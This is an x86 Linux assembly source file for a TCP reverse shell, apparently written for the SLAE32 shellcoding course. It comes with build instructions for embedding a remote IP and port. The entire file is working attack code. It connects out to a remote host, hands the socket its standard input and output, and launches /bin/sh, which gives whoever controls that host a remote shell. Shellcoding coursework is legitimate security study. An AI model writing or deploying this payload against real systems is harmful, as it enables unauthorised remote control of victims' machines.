; reverse.nasm - A TCP Reverse Shell
; Assignment 2 of SLAE32 course
; 2018-06-27 Thomas Karpiniec

; Compile with remote IP address and port in network byte order, e.g. 127.1.1.1:4444
;     nasm -f elf32 -o reverse.o -DREMOTE_IP=0x0101017f -DREMOTE_PORT=0x5c11 reverse.nasm

global _start
       
        AF_INET		equ 2
        SOCK_STREAM 	equ 1
        SYS_SOCKET 	equ 359
        SYS_BIND 	equ 361
	SYS_CONNECT	equ 362
        SYS_DUP2 	equ 63
        SYS_EXECVE 	equ 11

_start:
	; Obtain an AF_INET socket
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	mov ax, SYS_SOCKET	; syscall
	mov bl, AF_INET		; domain
	mov cl, SOCK_STREAM	; type
	xor edx, edx		; protocol = 0
	int 0x80

	; Minimum viable struct sockaddr_in
	; We'll say that it's 16 bytes long but it should ignore trailing data?
	push edx 		; 0x00000000 = IPADDR_ANY
	push dx			; 0x0000 = choose an ephemeral port
	push bx			; 0x0002 = AF_INET from before

	mov ebx, eax		; Save socket fd in EBX for next call
	
	; Bind to all interfaces and ephemeral port for outgoing connection
	mov ax, SYS_BIND	; syscall
	; EBX = sockfd aleady
	mov ecx, esp		; esp points to start of sockaddr
	mov dl, 16   		; addrlen = sizeof(struct sockaddr) = 16
	int 0x80		; assume bind worked, eax = 0

	; Re-use our sockaddr with the target port and address
	mov word [ecx+2], REMOTE_PORT
	mov dword [ecx+4], REMOTE_IP

	; Establish a connection
	mov ax, SYS_CONNECT
	; Parameters are the same as bind() - sockfd, ptr to sockaddr, addrlen
	; Having updated the sockaddr, they are now all set correctly
	int 0x80		; assume connection worked, EAX = 0

	; Redirect STDIN, STDOUT and STDERR to the client socket
	xor ecx, ecx
	mov cl, 3		; start at STDERR+1 and go down
next_dup:
	mov al, SYS_DUP2        ; syscall. first param oldfd already in EB
	dec ecx
	int 0x80
	jnz short next_dup	; keep going until we've run it for ecx = 0

	; Execute /bin/sh, inheriting file descriptors from this process
	; /bin//sh = 0x2f 0x62 0x69 0x6e 0x2f 0x2f 0x73 0x68
	push ecx   		; null termination
	push dword 0x68732f2f	; last half of string
	push dword 0x6e69622f	; first half of string = filename
	mov ebx, esp		; ebx = ptr to filename
	push ecx		; null terminator of array = envp array
	mov edx, esp		; edx = ptr to envp
	push ebx      		; After this, esp = start of argv array
	mov ecx, esp		; edx = ptr to argv

	mov al, SYS_EXECVE	; syscall
	int 0x80
